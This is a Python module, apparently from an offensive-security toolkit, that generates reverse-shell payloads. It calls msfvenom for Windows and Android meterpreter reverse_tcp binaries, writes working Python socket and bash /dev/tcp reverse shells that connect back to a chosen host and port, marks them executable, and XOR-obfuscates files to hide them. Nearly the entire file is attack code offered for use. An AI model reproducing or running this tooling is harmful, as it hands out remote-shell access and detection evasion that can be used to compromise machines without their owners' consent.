"""
Payload Generator Utility
This module provides functionality to generate various types of payloads, including MSFVenom integration.
"""

import os
import random
import string
import subprocess
from pathlib import Path
from rich.console import Console

console = Console()

class PayloadGenerator:
    def __init__(self, output_dir="payloads"):
        """
        Initialize the payload generator.
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_shell_payload(self, payload_type="python", lhost="127.0.0.1", lport="4444", output_file=None):
        """
        Generate a shell payload. Supports real MSFVenom for EXE/DLL/APK.
        """
        if not output_file:
            ext = "py" if payload_type == "python" else ("sh" if payload_type == "bash" else payload_type)
            output_file = f"payload_{random.randint(1000, 9999)}.{ext}"
        
        output_path = self.output_dir / output_file

        # Check if msfvenom is available for binary payloads
        if payload_type in ["exe", "dll", "apk"]:
            console.print(f"[*] Generating [cyan]{payload_type}[/cyan] payload via MSFVenom...")
            msf_payload = f"windows/x64/meterpreter/reverse_tcp" if payload_type != "apk" else "android/meterpreter/reverse_tcp"
            
            cmd = [
                "msfvenom", "-p", msf_payload,
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", payload_type, "-o", str(output_path)
            ]
            
            try:
                subprocess.run(cmd, check=True, capture_output=True)
                console.print(f"[green][+] Payload generated: {output_path}[/green]")
                return output_path
            except Exception as e:
                console.print(f"[red][!] MSFVenom failed: {e}[/red]")
                return None

        # Fallback to internal templates for scripts
        if payload_type == "python":
            payload = f"""#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
        elif payload_type == "bash":
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")

        with open(output_path, 'w') as f:
            f.write(payload)
        
        os.chmod(output_path, 0o755)
        console.print(f"[green][+] Script payload generated: {output_path}[/green]")
        return output_path

    def obfuscate_payload(self, file_path):
        """
        Apply simple XOR obfuscation to a file.
        """
        console.print(f"[*] Obfuscating [cyan]{file_path}[/cyan]...")
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            key = random.randint(1, 255)
            obfuscated = bytes([b ^ key for b in data])
            
            with open(file_path.with_suffix('.xor'), 'wb') as f:
                f.write(obfuscated)
                f.write(bytes([key])) # Append key at end for simple reversal
            
            console.print(f"[green][+] Obfuscated version created: {file_path.with_suffix('.xor')}[/green]")
        except Exception as e:
            console.print(f"[red][!] Obfuscation failed: {e}[/red]")

    def generate_random_string(self, length=32):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
